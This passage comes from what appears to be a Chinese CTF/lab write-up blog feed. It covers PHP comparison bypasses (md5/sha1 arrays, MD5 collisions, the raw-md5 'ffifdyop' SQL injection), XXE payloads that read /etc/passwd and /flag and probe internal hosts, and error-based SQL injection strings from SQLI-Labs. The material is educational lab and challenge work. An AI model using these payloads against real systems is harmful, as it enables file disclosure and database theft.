class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;&lt;!-- --&gt;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$flag</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?a[]=<span class="hljs-number">1</span>&amp;b[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><blockquote><p>此时两个md5后的值采用严格比较，没有规定字符串如果这个时候传入的是数组不是字符串，可以利用md5()函数的缺陷进行绕过<br>md5()函数的描述是string md5(string $str[,bool $raw_output&#x3D;false])</p><p>md5中需要的是一个string参数，但是当你传入一个array(数组)是，md5()是不会报错的，只是无法求出array的md5的值，这样就会导致任意的2个array的md5的值都会相等</p></blockquote><ol start="3"><li>md5碰撞</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]!==(<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;success!);</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>在强类型比较的基础上，把比较类型的转成字符串，这样数组绕过就不能用了，这里可以通过md5碰撞去生成两个字符串内容不同，md5相同的文件。<br>真实md5碰撞，因为此时不能输入数组了，只能输入字符串</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a=M%C9h%FF%<span class="hljs-number">0</span>E%E3%<span class="hljs-number">5</span>C%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>r%D4w%<span class="hljs-number">7</span>Br%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%D3o%A7%B2%<span class="hljs-number">1</span>B%DCV%B7J%<span class="hljs-number">3</span>D%C0x%<span class="hljs-number">3</span>E%<span class="hljs-number">7</span>B%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%AF%BF%A2%<span class="hljs-number">00</span>%A8%<span class="hljs-number">28</span>K%F3n%<span class="hljs-number">8</span>EKU%B3_Bu%<span class="hljs-number">93</span>%D8Igm%A0%D1U%<span class="hljs-number">5</span>D%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%FB_%<span class="hljs-number">07</span>%FE%A2&amp;b=M%C9h%FF%<span class="hljs-number">0</span>E%E3%<span class="hljs-number">5</span>C%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>r%D4w%<span class="hljs-number">7</span>Br%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%D3o%A7%B2%<span class="hljs-number">1</span>B%DCV%B7J%<span class="hljs-number">3</span>D%C0x%<span class="hljs-number">3</span>E%<span class="hljs-number">7</span>B%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%AF%BF%A2%<span class="hljs-number">02</span>%A8%<span class="hljs-number">28</span>K%F3n%<span class="hljs-number">8</span>EKU%B3_Bu%<span class="hljs-number">93</span>%D8Igm%A0%D1%D5%<span class="hljs-number">5</span>D%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%FB_%<span class="hljs-number">07</span>%FE%A2<br></code></pre></td></tr></table></figure><ol start="4"><li>特殊情况</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!-- <span class="hljs-variable">$password</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>,<span class="hljs-literal">true</span>).<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$link</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag is :&#x27;</span>.<span class="hljs-variable">$flag</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;密码错误!&#x27;</span>;<br>&#125; --&gt;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-keyword">string</span>,raw)<br>参数描述<br><span class="hljs-keyword">string</span>必需。规定要计算的字符串。<br>raw可选。规定十六进制或二进制输出格式：<br><br>         <span class="hljs-literal">TRUE</span> - 原始 <span class="hljs-number">16</span> 字符二进制格式<br>          <span class="hljs-literal">FALSE</span> - 默认。<span class="hljs-number">32</span> 字符十六进制数<br></code></pre></td></tr></table></figure><blockquote><p>当md5函数的第二个参数为true时，该函数的输出是原始二进制格式，会被作为字符串处理。<br>理解这一点后，问题就简单了。<br>只要提交特定字符串，让其md5值以原始二进制格式输出（被当作字符串）时含有能触发SQL注入的特殊字符即可。</p></blockquote><p>如何找到这样的字符串呢？百度一番后我找到了两个：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">content: 129581926211651571912466741651878684928<br>hex: 06da5430449f8f6f23dfc1276f722738<br>raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1&#x27;or&#x27;8<br>string: T0Do#&#x27;or&#x27;8<br><br>content: ffifdyop<br>hex: 276f722736c95d99e921722cf9ed621c<br>raw: &#x27;or&#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1c<br>string: &#x27;or&#x27;6]!r,b<br></code></pre></td></tr></table></figure><h4 id="sha1"><a href="#sha1" class="headerlink" title="sha1()"></a>sha1()</h4><blockquote><p>同md5()一样，sha1()函数也无法处理数组，因此可以构造数组绕过。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;uname&#x27;</span>] == <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])<br><br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;passwd can not be uname.&#x27;</span>;<br><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])&amp;(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]==<span class="hljs-string">&#x27;margin&#x27;</span>))<br><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br><br>    <span class="hljs-keyword">else</span><br><br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;sorry!&#x27;</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &gt; <span class="hljs-number">9999999</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;*-*&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)<br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><strong>%00截断：ereg函数 读到 %00 的时候，就截止了。</strong></p><p>长度小于8大小大于99999999，可以用科学计数法来绕过，构造10的7次方 10000000&gt;9999999</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?password=1e7%00*-*<br></code></pre></td></tr></table></figure></blockquote><h4 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (@<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&quot;^[1-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;必须输入数字才行&#x27;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>], <span class="hljs-string">&#x27;#biubiubiu&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;骚年，继续努力吧啊~&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>构造数组绕过，并且值含有数字。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">payload:?ctf[]=1<br></code></pre></td></tr></table></figure></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NCTF2019True XML cookbook</title>
    <link href="/2022/03/03/NCTF2019True-XML-cookbook/"/>
    <url>/2022/03/03/NCTF2019True-XML-cookbook/</url>
    
    <content type="html"><![CDATA[<h3 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h3><p>2&#x2F;28&#x2F;2021</p><p>多云    正常</p><p>一如既往的登陆框，随便填个数据上传抓包</p><p><img src="https://i.loli.net/2021/03/02/1C7jAyDQBPUEc4g.png" alt="klooaynt.png"><img src="https://i.loli.net/2021/03/02/1C7jAyDQBPUEc4g.png" alt="60077-5cr6mwin3qc.png"></p><p>发现是XML 可以进行XXE攻击</p><p>什么是XXE？</p><blockquote><p>XXE（外部实体注入）是XML注入的一种，普通的XML注入利用面比较狭窄，如果有的话也是逻辑类漏洞。XXE扩大了攻击面。<br>当允许引用外部实体时，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。<br>防御方法：禁用外部实体（PHP：可以将libxml_disable_entity_loader设置为TRUE来禁用外部实体）</p></blockquote><p>构造外部实体</p><figure class="highlight xml"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hack</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">hacker</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;hacker;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>读取&#x2F;etc&#x2F;passwd<br><img src="https://i.loli.net/2021/03/02/w8geKzIscJ95aT4.png" alt="kloogklo.png"><img src="https://blog.110022.xyz/usr/uploads/2021/02/1132953658.png" alt="28102-a4il75nzaxs.png"></p><p>接下来读取&#x2F;flag文件 发现不行 可能是因为没有这个文件<br>应该是让我们进行内网探测</p><p>想办法找到主机的ip地址 扫描内网存活主机</p><p>在&#x2F;proc&#x2F;net&#x2F;arp这个文件中可以找到IP地址</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hack</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">hacker</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///proc/net/arp&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;hacker;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/02/eEjYrbgZsBKSxvU.png" alt="klooogtw.png"></p><p>访问IP地址</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><br><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hack</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">hacker</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://10.17.228.2&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;hacker;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/02/3Ackr2hsCqewMfa.png" alt="kloor18s.png"></p><p>进行C段探测 </p><p><img src="https://i.loli.net/2021/03/02/uH892XMbovNQR3r.png" alt="klooyf77.png"></p><p>得到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF XXE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NCTF2019Fake XML cookbook</title>
    <link href="/2022/03/03/NCTF2019Fake-XML-cookbook/"/>
    <url>/2022/03/03/NCTF2019Fake-XML-cookbook/</url>
    
    <content type="html"><![CDATA[<h3 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h3><p>12&#x2F;7&#x2F;2020</p><p>多云    正常</p><p>浅谈XXE漏洞<br><a href="https://www.freebuf.com/articles/web/126788.html">https://www.freebuf.com/articles/web/126788.html</a></p><p>bp抓包得到</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">POST /doLogin.php HTTP/1.1<br>Host: 70f93c9e-9e93-4f0f-a0d1-0201916b096c.node3.buuoj.cn<br>Content-Length: 69<br>Accept: application/xml, text/xml, */*; q=0.01<br>X-Requested-With: XMLHttpRequest<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36<br>Content-Type: application/xml;charset=UTF-8<br>Origin: http://70f93c9e-9e93-4f0f-a0d1-0201916b096c.node3.buuoj.cn<br>Referer: http://70f93c9e-9e93-4f0f-a0d1-0201916b096c.node3.buuoj.cn/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7<br>Connection: close<br><br>&lt;user&gt;&lt;username&gt;Jonathan&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure><p>这里看到username和password都是xml格式，接下来增加我们自己的恶意实体，读取&#x2F;etc&#x2F;passwd文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hack</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">hacker</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;hacker;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>成功读取到  就可以读取&#x2F;flag文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hack</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">hacker</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;hacker;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF XXE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLI-Labs Advanced Injections</title>
    <link href="/2022/03/03/SQLI-Labs-Advanced-Injections/"/>
    <url>/2022/03/03/SQLI-Labs-Advanced-Injections/</url>
    
    <content type="html"><![CDATA[<h1 id="SQLI-Labs-Advanced-Injections"><a href="#SQLI-Labs-Advanced-Injections" class="headerlink" title="SQLI-Labs Advanced Injections"></a>SQLI-Labs Advanced Injections</h1><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><blockquote><h6 id="base64编码后url再次编码-cookie为注入点"><a href="#base64编码后url再次编码-cookie为注入点" class="headerlink" title="base64编码后url再次编码 cookie为注入点"></a>base64编码后url再次编码 cookie为注入点</h6></blockquote><p>构造payload</p><p><img src="https://i.loli.net/2021/03/25/od4J6OQREcvLGlw.png" alt="image-20210325134834590"></p><p>以’)为闭合方式</p><p>测试得知为3列</p><p><img src="https://i.loli.net/2021/03/25/Yt9euakx6dqlNFh.png" alt="image-20210325135003467"></p><p>构造sql注入payload</p><figure class="highlight sql"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-string">&#x27;) union select 1,2,exp(~(select * from (select database())x))#</span><br><span class="hljs-string">admin&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)x))#<br>admin<span class="hljs-string">&#x27;) union select 1,2,exp(~(select * from (select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1)x))#</span><br><span class="hljs-string">admin&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)x))#<br></code></pre></td></tr></table></figure><h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><blockquote><p>闭合方式不一样 正则表达式过滤了常见的# –+ 不能注释</p></blockquote><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-23</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,exp(~(select * from (select database())x))&#x27;</span> <br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-23</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1)x))&#x27;</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-23</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,exp(~(select * from (select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1)x))&#x27;</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-23</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,exp(~(select * from (select username from users limit 0,1)x))&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="Less-24"><a href="#Less-24" 